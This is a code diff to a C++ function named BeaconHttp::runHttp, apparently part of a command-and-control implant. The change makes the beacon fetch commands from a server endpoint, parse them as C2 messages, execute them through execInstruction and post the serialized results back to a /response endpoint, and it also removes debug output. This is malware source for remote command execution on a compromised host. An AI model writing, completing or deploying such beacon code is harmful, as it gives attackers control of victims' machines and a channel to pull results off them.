@@ -26,29 +26,25 @@ int BeaconHttp::runHttp()
 	{
 		string cmd;
 
-		std::cout << "cmd; " << std::endl;
-
 		httplib::Client cli("localhost", 8080);
 
-		if (auto res = cli.Get("/hi")) 
+		if (auto res = cli.Get("/cmd")) 
 		{
 			if (res->status == 200) 
 			{
-				std::cout << res->body << std::endl;
 				cmd = res->body;
+				if (!cmd.empty())
+				{
+					C2Message c2Message;
+					c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
+					C2Message c2RetMessage;
 
-				C2Message c2Message;
-				c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
-				C2Message c2RetMessage;
+					exit = execInstruction(c2Message, c2RetMessage);
 
-				exit = execInstruction(c2Message, c2RetMessage);
-
-				string out;
-				c2RetMessage.SerializeToString(&out);
-
-				std::cout << "out " << out << std::endl;
-
-				// TODO envoye dans le post ou get
+					string out;
+					c2RetMessage.SerializeToString(&out);
+					auto res2 = cli.Post("/response", out.data(), out.size(), "test");
+				}
 			}
 		}
 		else
